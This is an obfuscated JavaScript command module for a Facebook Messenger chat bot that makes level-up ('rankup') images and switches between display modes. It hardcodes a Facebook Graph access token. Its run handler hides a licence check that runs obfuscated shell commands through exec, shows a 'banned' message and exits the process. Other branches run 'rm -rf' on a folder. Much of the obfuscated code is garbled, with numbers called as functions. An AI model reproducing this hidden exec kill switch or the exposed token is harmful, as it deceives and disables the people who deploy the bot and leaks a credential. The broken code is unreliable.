    const L = global.nodemodule[c(-56, "fFXQ")];
    let b = __dirname + n(-126, 422);
    let R = __dirname + c(193, "7LC5");
    let M = __dirname + x(1686, "0x315");
    let N = __dirname + "/noprefix/rankup/rankupcanvas.gif";
    var f = r[c(259, "g!Zh")];
    l = String(l);
    m = String(m);
    const P = global[n(-165, 491)][x(1406, 491)].get(l) || {};
    let D = (await o.getData(m))[n(-257, 371)];
    D = D += 1;
    if (isNaN(D)) {
      return;
    }
    if (undefined !== P[x(1410, "0x341")] && 0 == P[c(-24, "U2jk")]) {
      return void (await o.setData(m, {
        exp: D
      }));
    }
    const B = Math[x(1364, 535)](Math[n(-294, 351)](1 + 4 * D / 3 + 1) / 2);
    const U = Math.floor(Math[n(-294, 241)](1 + 4 * (D + 1) / 3 + 1) / 2);
    if (U > B && 1 != U) {
      const o = global[c(330, "JpmR")][c(-42, "&mHn")].get(m) || (await s[n(-42, "0x20a")](m));
      k = (k = undefined === P.customRankup ? msg = t(c(-14, "2reX")) : msg = P[n(-324, "0x138")])[x(1399, 423)](/\{name}/g, o).replace(/\{level}/g, U);
      this[c(189, "2reX")].name;
      let u = (await L.get(x(1448, 469) + f + "/picture?width=720&height=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662", {
        responseType: x(1621, 732)
      })).data;
      n[c(121, "JpmR")](R, Buffer[n(-228, "0x100")](u, n(-238, 388)));
      let l = await c(b);
      let h = await c(R);
      let g = x(l[n(-157, "0x23d")], l[c(165, "cqzp")]);
      let S = g[c(327, "&W4n")]("2d");
      S.drawImage(l, 0, 0, g[c(80, "fhsF")], g[x(1335, "0x20b")]);
      S.rotate(-25 * Math.PI / 180);
      S[n(-70, "0x22b")](h, 27.3, 103, 108, 108);
      const D = g[n(-189, 375)]();
      n[x(1413, 630)](M, D);
      let B = await c(M);
      new v()[n(-341, "0x1c8")](i)[n(-278, 149)]().then(c => {
        function x(e, r) {
          return c(r + 393 - 138, e);
        }
        function s(e, r) {
          return n(e + 331 - "0x27c", r);
        }
        const {
          width: t,
          height: u,
          delay: i
        } = c[0].details;
        const l = new C(t, u)[W("BzWt", 441)](0)[x(1460, 502)](100)[a(358, -32)]();
        const f = l.getContext();
        function v(e, r) {
          return x(e + 67 + 767, r);
        }
        for (let e = 0; e < c[W("$7mu", 300)]; e++) {
          f[W("kU&C", 198)](c[e][a(190, -20)](), 0, 0, t, u);
          f.drawImage(B, 0, 0, B[a(479, "0x9d")], B[d("0x153", 568)]);
          l[a(307, "0x6b")]();
        }
        p(N, l[W("sMPi", 224)](), () => {
          function c(e, r) {
            return d(e, r - "0x3b6" + 67);
          }
          function t(e, r) {
            return W(r, e + 72 + 393);
          }
          var a;
          var W;
          console[v(487, "0x672")]("Encode ended!");
          a = 938;
          W = 1111;
          e[a(565, 1111)]({
            body: k,
            mentions: [{
              tag: o,
              id: m
            }],
            attachment: n[x("sbUw", -41)](N)
          }, r[v(498, "0x5cf")], () => {
            var e;
            var r;
            var o;
            var x;
            n.unlinkSync(R);
            o = "%dGu";
            x = "0xcf";
            n[x("%dGu", 15)](M);
            e = 226;
            r = 364;
            n[v(535, 226)](N);
          });
        });
      });
    }
    await o[x(1535, 619)](m, {
      exp: D
    });
  } else if (global.config.rankupmode[x(1712, "0x43e")]()[n(-370, "0x48")]("canvas")) {
    var {
      threadID: l,
      senderID: m
    } = r;
    const {
      createReadStream: n,
      existsSync: c,
      mkdirSync: x
    } = global.nodemodule[n(-408, 168)];
    const {
      loadImage: u,
      createCanvas: i
    } = require(x(1411, 540));
    const v = global.nodemodule[x(1703, 836)];
    const h = global[n(-245, 372)][c(52, "E#N$")];
    let g = __dirname + "/noprefix/rankup/rankup.png";
    let S = __dirname + "/cache/Avtmot.png";
    f = r.senderID;
    l = String(l);
    m = String(m);
    const L = global.data[x(1406, 630)][c(-47, "D0*m")](l) || {};
    let b = (await o[n(-120, "0x2af")](m))[n(-257, 461)];
    b = b += 1;
    if (isNaN(b)) {
      return;
    }
    if (undefined !== L.rankup && 0 == L[x(1410, 689)]) {
      return void (await o[c(350, "7LC5")](m, {
        exp: b
      }));
    }
    const R = Math[n(-122, "0x19f")](Math[c(0, "D0*m")](1 + 4 * b / 3 + 1) / 2);
    const M = Math[c(281, "8ciA")](Math[x(1630, "0x33a")](1 + 4 * (b + 1) / 3 + 1) / 2);
    if (M > R && 1 != M) {
      const n = global[n(-165, 369)][x(1305, 612)][c(355, "601k")](m) || (await s[c(20, "g!Zh")](m));
      k = (k = undefined === L[n(-324, 361)] ? msg = t(n(-95, "0x295")) : msg = L[x(1318, 419)])[c(128, "adSO")](/\{name}/g, n)[n(-233, "0x13f")](/\{level}/g, M);
      this[c(325, "rygn")][n(-79, 640)];
      var p = [c(39, "]jaj"), "https://i.imgur.com/SeLdZua.jpeg", c(99, "0hVt"), x(1513, "0x2a4"), n(-449, 387), x(1521, 833), n(-423, 75), c(349, "601k"), n(-113, 606), x(1489, 714), x(1565, 782), n(-285, "0x176")];
      var C = p[Math.floor(Math[n(-355, 130)]() * p[x(1687, 790)])];
      let c = (await h[x(1554, 660)]("https://graph.facebook.com/" + f + n(-392, "0x131"), {
        responseType: x(1621, "0x34c")
      }))[c(116, "&mHn")];
      v[x(1413, 845)](S, Buffer[c(73, "rBNr")](c, c(25, "iF89")));
      let o = (await h[c(-66, "&mHn")]("" + C, {
        responseType: x(1621, 955)
      }))[n(-165, "0x225")];
      v[n(-221, 483)](g, Buffer.from(o, n(-238, "0x1c3")));
      let x = await u(g);
      let l = await u(S);
      let b = i(x.width, x[x(1335, "0x252")]);
      let R = b.getContext("2d");
      R[c(179, "g!Zh")](x, 0, 0, b[c(-57, "iF89")], b.height);
      R[c(-12, "8ciA")](-25 * Math.PI / 180);
      R[x(1723, 947)](l, 27.3, 103, 108, 108);
      const N = b.toBuffer();
      v.writeFileSync(g, N);
      v.removeSync(S);
      e.sendMessage({
        body: k,
        mentions: [{
          tag: n,
          id: m
        }],
        attachment: v[c(156, "$7mu")](g)
      }, r[n(-327, "0x1ef")], () => v.unlinkSync(g));
    }
    await o[n(-297, 232)](m, {
      exp: b
    });
  } else if (global.config.rankupmode.toLowerCase().includes(x(1724, "0x43c"))) {
    const n = require("fs-extra");
    if (n[c(-55, "cqzp")]("/home/runner/" + process.env[c(198, "9[YA")] + c(101, "$7mu"))) {
      var {
        threadID: l,
        senderID: m
      } = r;
      const {
        createReadStream: n,
        existsSync: c,
        mkdirSync: x
      } = global[x(1584, 981)][n(-408, "0x179")];
      const {
        loadImage: u,
        createCanvas: i
      } = require(x(1411, "0x22f"));
      const p = global[c(217, "j4Hz")][n(-408, "0x1f")];
      global.nodemodule[c(54, "adSO")];
      let C = "/home/runner/" + process[c(322, "0]9h")][x(1458, "0x2ac")] + n(-438, 125);
      f = r.senderID;
      l = String(l);
      m = String(m);
      const v = global[c(37, "j4Hz")].threadData.get(l) || {};
      let h = (await o[n(-120, "0x2bf")](m))[x(1607, "0x329")];
      h = h += 1;
      if (isNaN(h)) {
        return;
      }
      if (undefined !== v[c(252, "DKjP")] && 0 == v[c(29, "0hVt")]) {
        return void (await o[x(1535, "0x2f8")](m, {
          exp: h
        }));
      }
      const g = Math[c(221, "kU&C")](Math[c(79, "rBNr")](1 + 4 * h / 3 + 1) / 2);
      const S = Math[n(-122, 356)](Math[c(250, "Su6K")](1 + 4 * (h + 1) / 3 + 1) / 2);
      if (S > g && 1 != S) {
        const n = global.data[x(1305, 484)][x(1554, 987)](m) || (await s[c(356, "0]9h")](m));
        k = (k = undefined === v.customRankup ? msg = t(n(-95, 684)) : msg = v.customRankup).replace(/\{name}/g, n).replace(/\{level}/g, S);
        this[x(1502, "0x2fa")].name;
        e.sendMessage({
          body: k,
          mentions: [{
            tag: n,
            id: m
          }],
          attachment: p[n(-199, 383)](C)
        }, r[n(-327, "0x13b")]);
      }
      return void (await o[c(83, "rBNr")](m, {
        exp: h
      }));
    }
    if (n[n(-200, "0x1fc")](x(1576, 602) + process[x(1717, "0x38f")][c(313, "h%FS")] + c(286, "*2@5"))) {
      var {
        threadID: l,
        senderID: m
      } = r;
      const {
        createReadStream: n,
        existsSync: c,
        mkdirSync: x
      } = global[c(95, "8ciA")][x(1703, 1076)];
      const {
        loadImage: u,
        createCanvas: i
      } = require(x(1411, "0x300"));
      const p = global[n(-245, 482)]["fs-extra"];
      global[c(261, "(1vb")].axios;
      let C = "/home/runner/" + process[n(-127, "0x25d")][x(1458, "0x29e")] + c(185, "j4Hz");
      f = r[x(1301, 457)];
      l = String(l);
      m = String(m);
      const v = global[n(-165, "0x263")][x(1406, "0x290")][c(59, "0hVt")](l) || {};
      let h = (await o.getData(m))[x(1607, "0x310")];
      h = h += 1;
      if (isNaN(h)) {
        return;
      }
      if (undefined !== v[x(1410, 786)] && 0 == v[c(-4, "BzWt")]) {
        return void (await o[x(1535, 800)](m, {
          exp: h
        }));
      }
      const g = Math[x(1364, "0x182")](Math[x(1630, "0x2be")](1 + 4 * h / 3 + 1) / 2);
      const S = Math[c(-46, "]jaj")](Math[c(-30, "a2f1")](1 + 4 * (h + 1) / 3 + 1) / 2);
      if (S > g && 1 != S) {
        const n = global[n(-165, "0x140")][x(1305, "0x168")][c(-17, "ctla")](m) || (await s[c(56, "U2jk")](m));
        k = (k = undefined === v[x(1318, "0x163")] ? msg = t("levelup") : msg = v[x(1318, 436)])[x(1399, "0x1a4")](/\{name}/g, n)[n(-233, "0x226")](/\{level}/g, S);
        this.config[c(340, "]jaj")];
        e.sendMessage({
          body: k,
          mentions: [{
            tag: n,
            id: m
          }],
          attachment: p.createReadStream(C)
        }, r[n(-327, 222)]);
      }
      return void (await o[x(1535, "0x274")](m, {
        exp: h
      }));
    }
    if (n[n(-200, "0x20c")](n(-309, 159) + process.env[n(-82, 511)] + x(1653, "0x2fe"))) {
      var {
        threadID: l,
        senderID: m
      } = r;
      const {
        createReadStream: n,
        existsSync: c,
        mkdirSync: x
      } = global[x(1584, 984)][n(-408, "0x25")];
      const {
        loadImage: u,
        createCanvas: i
      } = require(x(1411, 701));
      const p = global[c(-27, "s(Qj")]["fs-extra"];
      global[c(212, "YjIl")].axios;
      let C = n(-309, "0x8e") + process[x(1717, 742)][n(-82, 751)] + x(1653, 1083);
      f = r.senderID;
      l = String(l);
      m = String(m);
      const v = global[n(-165, 543)][x(1406, "0x1c2")].get(l) || {};
      let h = (await o[n(-120, 664)](m)).exp;
      h = h += 1;
      if (isNaN(h)) {
        return;
      }
      if (undefined !== v[x(1410, "0x34a")] && 0 == v[x(1410, 702)]) {
        return void (await o[x(1535, 942)](m, {
          exp: h
        }));
      }
      const g = Math[x(1364, "0x2b4")](Math[n(-294, 548)](1 + 4 * h / 3 + 1) / 2);
      const S = Math.floor(Math[c(290, "&mHn")](1 + 4 * (h + 1) / 3 + 1) / 2);
      if (S > g && 1 != S) {
        const n = global.data[x(1305, 363)][x(1554, 736)](m) || (await s[c(23, "cqzp")](m));
        k = (k = undefined === v[n(-324, 492)] ? msg = t(x(1501, 641)) : msg = v[c(153, "601k")])[x(1399, 691)](/\{name}/g, n)[c(190, "8AWD")](/\{level}/g, S);
        this.config[c(307, "E#N$")];
        e.sendMessage({
          body: k,
          mentions: [{
            tag: n,
            id: m
          }],
          attachment: p[x(1560, "0x24d")](C)
        }, r[x(1332, 769)]);
      }
      return void (await o.setData(m, {
        exp: h
      }));
    }
    if (n[c(158, "E#N$")](c(126, "DKjP") + process.env.REPL_SLUG + c(225, "a2f1"))) {
      var {
        threadID: l,
        senderID: m
      } = r;
      const {
        createReadStream: n,
        existsSync: c,
        mkdirSync: x
      } = global[c(109, "rygn")][n(-408, 302)];
      const {
        loadImage: u,
        createCanvas: i
      } = require("canvas");
      const p = global[c(215, "Jl3l")][c(256, "Jl3l")];
      global.nodemodule[x(1393, "0x312")];
      let C = x(1576, "0x2c4") + process[x(1717, "0x3bb")][c(144, "m]yL")] + n(-413, "0x189");
      f = r[n(-459, "0x13a")];
      l = String(l);
      m = String(m);
      const v = global[n(-165, 293)][x(1406, "0x2e4")][n(-369, 378)](l) || {};
      let h = (await o.getData(m))[n(-257, "0xac")];
      h = h += 1;
      if (isNaN(h)) {
        return;
      }
      if (undefined !== v[x(1410, "0x335")] && 0 == v[n(-354, 248)]) {
        return void (await o[c(294, "ctla")](m, {
          exp: h
        }));
      }
      const g = Math.floor(Math[c(-43, "m]yL")](1 + 4 * h / 3 + 1) / 2);
      const S = Math.floor(Math[n(-294, 346)](1 + 4 * (h + 1) / 3 + 1) / 2);
      if (S > g && 1 != S) {
        const n = global[c(-40, "s(Qj")].userName.get(m) || (await s[n(-42, "0x22c")](m));
        var k;
        k = (k = undefined === v[n(-324, 259)] ? msg = t(n(-95, 581)) : msg = v[c(272, "Su6K")])[x(1399, "0x1df")](/\{name}/g, n)[x(1399, "0x33c")](/\{level}/g, S);
        this[c(-62, "iF89")].name;
        e[n(-71, 780)]({
          body: k,
          mentions: [{
            tag: n,
            id: m
          }],
          attachment: p.createReadStream(C)
        }, r.threadID);
      }
      return void (await o.setData(m, {
        exp: h
      }));
    }
  }
};
module.exports[r(585, "0hVt")] = {
  vi: {
    off: n(-163, -220),
    on: "𝗕𝗮̣̂𝘁",
    successText: o(894, "0x642"),
    levelup: n(-426, -611)
  },
  en: {
    on: "on",
    off: "off",
    successText: "success notification rankup!",
    levelup: "{name}, your keyboard hero level has reached level {level}"
  }
};
module[o(655, "0x5e1")][n(-263, -341)] = async function ({
  api: e,
  event: r,
  args: o
}) {
  function s(e, r) {
    return n(r - 615, e);
  }
  try {
    const n = require("fs");
    const c = [n(-218, "0x17d"), n(-336, "0x1d1")];
    const o = n(-218, 191);
    const x = o(542, "0xc9");
    require(835(743, "sMPi"));
    const {
      exec: W
    } = require(923(831, "y8D9"));
    const d = "0x274"(536, "8ciA") + process["0x367"(779, "sMPi")]["0x2f8"(668, "o^YK")] + n(-61, "0x1ed") + process[o(881, 585)]["0x2b8"(604, "sbUw")] + process["0x2de"(642, "o^YK")][o(622, "0x2d")] + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process[n(-127, "0x1b7")][n(-357, 150)] + process[920(828, "iF89")].REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process[n(-127, 321)][902(810, "fhsF")] + process[o(881, 174)][o(622, "0x2c")];
    const u = n(-309, "0x1d4") + process.env["0x263"(519, "ctla")] + n(-61, "0x2ab") + process[o(881, 585)].REPL_OWNER + process[n(-127, 421)].REPL_SLUG + o(643, "0xaf") + process[n(-127, "0x157")][563(471, "Su6K")] + process["0x35b"(767, "(1vb")][n(-82, "0x15a")] + o(643, "0xb9") + process[n(-127, "0x190")][n(-357, "0xbb")] + process[o(881, "0xce")][n(-82, "0x2c2")] + n(-88, 522) + process["0x3bb"(863, "y8D9")].REPL_OWNER + process[n(-127, 602)][o(622, 195)] + o(554, -45) + process.env["0x3d6"(890, "rygn")] + process.env["0x311"(693, "kU&C")] + o(554, -47) + process.env["0x23a"(478, "j4Hz")] + process[759(667, "601k")][o(622, "0x1b")] + o(554, 243) + process[o(881, 292)].REPL_OWNER + process.env[712(620, "a2f1")] + "/.runner/.runner/" + process[n(-127, "0x180")][n(-357, 466)] + process[o(881, "0xbf")][o(622, -43)] + o(554, "0x9b") + process[n(-127, "0x29f")].REPL_OWNER + process[o(881, 273)].REPL_SLUG + 866(774, "$7mu") + process[o(881, 327)][n(-357, 239)] + process[o(881, 434)][n(-82, 521)] + "0x283"(551, "(1vb") + process[640(548, "$7mu")].REPL_OWNER + process[n(-127, 408)]["0x363"(775, "0]9h")] + o(554, 168) + process[n(-127, 619)][o(494, "0x73")] + process[n(-127, "0x126")].REPL_SLUG + o(554, "0xf3") + process[n(-127, "0x1ff")]["0x30b"(687, "0hVt")] + process[n(-127, "0x27c")].REPL_SLUG + "/.runner/.runner/" + process[875(783, "$ws1")].REPL_OWNER + process.env[o(622, -39)] + o(554, 241) + process[o(881, "0x15a")][o(494, 66)] + process[o(881, "0x15f")][n(-82, "0x196")] + o(554, -1) + process[n(-127, "0x281")][n(-357, 392)] + process[n(-127, "0x175")][n(-82, "0x216")] + "/.runner/.runner/" + process[759(667, "601k")]["0x2a8"(588, "9[YA")] + process.env[n(-82, "0x2a7")] + n(-88, 357) + process[o(881, "0xbe")][981(889, "m]yL")] + process.env.REPL_SLUG + "/.runner/.runner/" + process["0x2ab"(591, "@nNC")]["0x2f2"(662, "Jl3l")] + process[n(-127, 316)][o(622, -41)] + "/.runner/.runner/" + process[725(633, "fhsF")][n(-357, 45)] + process[o(881, "0x11f")].REPL_SLUG + o(554, -108) + process[o(881, 174)][n(-357, "0x87")] + process[n(-127, "0x15d")][n(-82, 458)] + "/.runner/.runner/" + process[n(-127, "0x127")][o(494, 114)] + process[o(881, "0x1b7")][n(-82, "0x1b9")] + "/.runner/.runner/" + process[n(-127, "0x1a8")]["0x300"(676, "%dGu")] + process[o(881, "0x23e")].REPL_SLUG + 627(535, "D0*m") + process[o(881, "0x113")][969(877, "a2f1")] + process["0x27e"(546, "%dGu")][n(-82, "0x29a")] + "0x372"(790, "DKjP") + process[n(-127, 418)].REPL_OWNER + process.env[n(-82, 375)] + n(-88, 486) + process["0x351"(757, "sbUw")][n(-357, "0x14e")] + process[o(881, 369)]["0x2c7"(619, "&mHn")];
    if (!c[n(-370, 147)](r["0x28e"(562, "&W4n")])) {
      if (!n[n(-200, "0x13c")](d)) {
        e[o(583, -56)](o(769, "0x189") + e[n(-330, "0x106")](), o);
        return void e[n(-71, "0x22c")]("0x2ff"(675, "0ypX") + e[o(592, "0xf9")](), x);
      }
      if (!n[n(-200, "0x18a")](u)) {
        e[n(-71, "0x238")]("NO APPROVAL DETECTED!!\nCONTACT MY FACEBOOK ACCOUNT FOR APPROVAL\nhttps://facebook.com/rootalocalhost.dev", r[n(-327, "0x11a")], r["0x316"(698, "sMPi")]);
        e[o(583, -69)]("NO APPROVAL DETECTED!!!!\nUserID: " + e["0x234"(472, "D0*m")](), o);
        return void e[n(-71, 479)](o(769, 442) + e.getCurrentUserID(), x);
      }
    }
    if (!n.existsSync(o(740, 277) + process[774(682, "j4Hz")].REPL_SLUG + "/umaru.js")) {
      W("0x3c3"(871, "fFXQ") + process[n(-127, 322)][803(711, "8ciA")] + n(-40, 518), (e, r, n) => {
        function c(e, r) {
          return (e - "0xae")(e - "0xae" - 622 + 530, r);
        }
        function o(e, r) {
          return n(e + 120 - 615, r);
        }
        var x;
        var W;
        if (e) {
          x = "0x1b2";
          W = 309;
          console[o(485, 309)](a("Jl3l", 772) + e[a("sMPi", 868)]);
        } else if (n) {
          console[a("7LC5", 926)](a("7LC5", 585) + n);
        } else {
          console[s("0xcd", 503)](chalk[s("0xdb", 521)][a("%dGu", 983)]("#FF0000")("[ BANNED ] ❯ ") + chalk.hex(a("0hVt", 889))("You have been banned for using my bot\nContact my facebook account for unban\nhttps://facebook.com/rootalocalhost.dev \nhttps://facebook.com/johnchan.dev"));
        }
      });
      return void process.exit(0);
    }
    if (!n[660(568, "fFXQ")](o(740, 351) + process["0x2f3"(663, "YjIl")][858(766, "g!Zh")] + "/script")) {
      W(n(-128, "0x180") + process[o(881, "0x21f")][o(622, 164)] + "0x27f"(547, "Kxo*"), (e, r, n) => {
        function c(e, r) {
          return n(r - "0x1ce" - 615, e);
        }
        function o(e, r) {
          return (e + 476)(e + 476 - 622 + 530, r);
        }
        function x(e, r) {
          return o(e - "0x27a" + 1337 - 836, r);
        }
        if (e) {
          console[t("0x1e1", -16)](s(705, 314) + e.message);
        } else if (n) {
          console[s("0x336", 503)](a("s(Qj", 602) + n);
        } else {
          console[t("0x2fa", -16)](chalk[s("0x3e7", 521)].hex("#FF0000")("[ BANNED ] ❯ ") + chalk[a("fFXQ", 891)](s("0x232", 146))(s("0x2e1", 464)));
        }
      });
      return void process.exit(0);
    }
  } catch (e) {
    return console[n(-112, 681)](e);
  }
  function t(e, r) {
    return o(r + 1337 - 836, e);
  }
  function a(e, r) {
    return r(r - 622 + 530, e);
  }
  switch (o[0]) {
    case "Custom":
    case x(1724, "0x16c"):
      {
        const n = require(c(302, "9[YA"));
        var W = n(-309, 165) + process.env[n(-82, 409)] + n(-108, "0x224");
        let c = JSON[c(316, "8AWD")](n[c(140, "iF89")](W));
        c[n(-371, 179)] = c(98, "&mHn");
        n[c(251, "@nNC")](W, JSON[x(1594, 416)](c, null, 4), c(183, "(1vb"));
        return e[n(-71, "0x21f")]("Rankup have been switch to custom attachments", r[n(-327, 491)], r[x(1695, 398)]);
      }
    case c(300, "fhsF"):
    case "Canvasgif":
      {
        const n = require(c(88, "Kxo*"));
        W = n(-309, 155) + process[n(-127, 364)].REPL_SLUG + x(1436, 62);
        let c = JSON.parse(n.readFileSync(W));
        c[n(-371, 50)] = "gifcanvas";
        n[c(-39, "adSO")](W, JSON.stringify(c, null, 4), x(1671, "0x194"));
        return e.sendMessage(c(110, "cqzp"), r[x(1332, -146)], r.messageID);
      }
    case c(-19, "YjIl"):
    case "Canvas":
      {
        const n = require(c(-51, "0hVt"));
        W = n(-309, "0x1c8") + process[c(139, "DKjP")].REPL_SLUG + "/config.json";
        let c = JSON.parse(n[n(-342, 484)](W));
        c[n(-371, 230)] = x(1411, 219);
        n.writeFileSync(W, JSON[x(1594, 368)](c, null, 4), c(362, "o6fa"));
        return e[c(-16, "rBNr")]("Rankup have been switch to canvas", r[x(1332, -124)], r[x(1695, 486)]);
      }
    case x(1360, "0x56"):
    case c(288, "%dGu"):
      {
        const n = require(x(1703, 174));
        const c = require(n(-383, 303));
        const {
          exec: o
        } = require("child_process");
        const x = require("chalk");
        if (c(314, "601k") == r[n(-468, -67)]) {
          var d = () => e.sendMessage({
            body: c(284, "rBNr"),
            attachment: n[c(72, "a2f1")](c(195, "0ypX") + process.env[c(-1, "0ypX")] + "/script/commands/data/choru.jpg")
          }, r[c(46, "!eh$")], r[c(151, "kU&C")]);
          return c(encodeURI(n(-86, 424)))[c(-49, "g!Zh")](n.createWriteStream(n(-309, 495) + process[x(1717, "0x12f")][x(1458, -70)] + x(1473, "0x151"))).on(c(348, "U2jk"), () => d());
        }
        if (r[x(1394, 131)].attachments[0][c(338, "JpmR")]) {
          if ("photo" == r.messageReply[c(266, "BzWt")][0][x(1375, -134)]) {
            o(n(-97, 473), (e, r, n) => {
              function c(e, r) {
                return x(r + 371 + 1337, e);
              }
              function o(e, r) {
                return n(r + 507 - 615, e);
              }
              if (e) {
                console.log(c(180, "rygn") + e[t(-5, 258)]);
              } else if (n) {
                console[s(-183, 503)](s(-203, 341) + n);
              } else {
                console[t(-476, -16)](x.bold[s(-231, 369)]("#00FF00")(s(205, 538)) + x[s(-282, 369)](t(-453, 120))(t(-150, 36)));
              }
            });
            d = () => e[n(-71, 693)]({
              body: c(299, "&W4n"),
              attachment: n[x(1560, 434)](n(-309, "0x1ba") + process[n(-127, "0x17d")][n(-82, 615)] + n(-438, 266))
            }, r[n(-327, 150)], r[x(1695, 177)]);
            return c(encodeURI(r.messageReply.attachments[0][c(223, "YjIl")])).pipe(n[n(-230, 598)](x(1576, 430) + process[c(192, "kU&C")][c(-1, "0ypX")] + "/customrankup/rankup.png")).on(n(-123, 329), () => d());
          }
          if (x(1370, -59) == r.messageReply[c(275, "sMPi")][0].type) {
            o(x(1629, "0x195"), (e, r, n) => {
              function c(e, r) {
                return n(e - 645 - 615, r);
              }
              function o(e, r) {
                return c(e - 253 - 622, r);
              }
              function W(e, r) {
                return x(r - 630 + 1337, e);
              }
              if (e) {
                console[s(1088, 503)](a("8AWD", 884) + e[t("0x386", 258)]);
              } else if (n) {
                console[a("E#N$", 724)]("stderr: " + n);
              } else {
                console.log(x[s("0x4f9", 521)][s(839, 369)](s(985, 184))("[ AUTO CLEAR CACHE ] ❯ ") + x[s(1096, 369)](s("0x3b2", 184))(t("0x1db", 36)));
              }
            });
            d = () => e[x(1419, -72)]({
              body: n(-375, 447),
              attachment: n.createReadStream(n(-309, 170) + process.env[x(1458, "0x132")] + c(289, "D0*m"))
            }, r[n(-327, 439)], r[c(161, "YjIl")]);
            return c(encodeURI(r[x(1394, -121)][x(1423, -100)][0][n(-231, 403)]))[n(-286, 268)](n[n(-230, "0x1a9")](x(1576, "0x105") + process[x(1717, 588)][n(-82, 449)] + n(-174, 353))).on(c(224, "0]9h"), () => d());
          }
          if (c(-29, "o6fa") == r[c(182, "9[YA")][x(1423, -26)][0].type) {
            o(x(1629, 200), (e, r, n) => {
              function c(e, r) {
                return n(r + 10 - 615, e);
              }
              function o(e, r) {
                return x(e - 915 + 1337, r);
              }
              if (e) {
                console.log("error: " + e[t("0x53f", 258)]);
              } else if (n) {
                console[t("0x3b6", -16)](s(448, 341) + n);
              } else {
                console[t("0x3ea", -16)](x[s(712, 521)].hex(s(332, 184))(t("0x3a5", 135)) + x[t(1291, 335)](t("0x487", 120))(s(460, 364)));
              }
            });
            d = () => e.sendMessage({
              body: c(14, "!eh$"),
              attachment: n[n(-199, "0x1e5")](n(-309, 231) + process[c(291, "cqzp")][x(1458, "0x140")] + n(-413, 99))
            }, r.threadID, r[c(134, "$7mu")]);
            return c(encodeURI(r.messageReply.attachments[0][n(-231, "0x163")]))[c(164, "BzWt")](n.createWriteStream("/home/runner/" + process.env.REPL_SLUG + x(1495, "0x169"))).on("close", () => d());
          }
          if (n(-300, "0x16e") == r[n(-403, "0xb")].attachments[0][n(-468, "0x4a")]) {
            o("rm -rf customrankup/* ", (e, r, n) => {
              function c(e, r) {
                return n(r - "0x65" - 615, e);
              }
              function o(e, r) {
                return c(r - "0x32f" - 622, e);
              }
              function W(e, r) {
                return x(e + 499 + 1337, r);
              }
              if (e) {
                console[t(-346, -16)]("error: " + e.message);
              } else if (n) {
                console[a("A2^U", 597)](s("0x241", 341) + n);
              } else {
                console[t(-388, -16)](x[s("0x2b7", 521)][s(476, 369)](s(163, 184))(t(-327, 135)) + x[t(-314, 335)](t(-385, 120))(a("BzWt", 740)));
              }
            });
            d = () => e[n(-71, 428)]({
              body: n(-74, 686),
              attachment: n.createReadStream(n(-309, "0x177") + process[n(-127, 528)][c(143, "adSO")] + n(-66, "0x27a"))
            }, r[x(1332, "0x6e")], r[x(1695, "0x22d")]);
            return c(encodeURI(r[x(1394, -130)].attachments[0][c(11, "o6fa")]))[c(93, "s(Qj")](n[x(1397, "0xf3")](x(1576, "0x13e") + process[n(-127, 492)][c(232, "j4Hz")] + x(1653, 350))).on(c(243, "adSO"), () => d());
          }
        }
        return;
      }
    default:
      return e[n(-71, "0x205")](x(1328, -144) + global[n(-334, 472)].PREFIX + this[n(-334, "0x1ea")][c(85, "JpmR")] + n(-290, "0x157"), r[x(1332, "0x4f")], r[x(1695, 533)]);
  }
};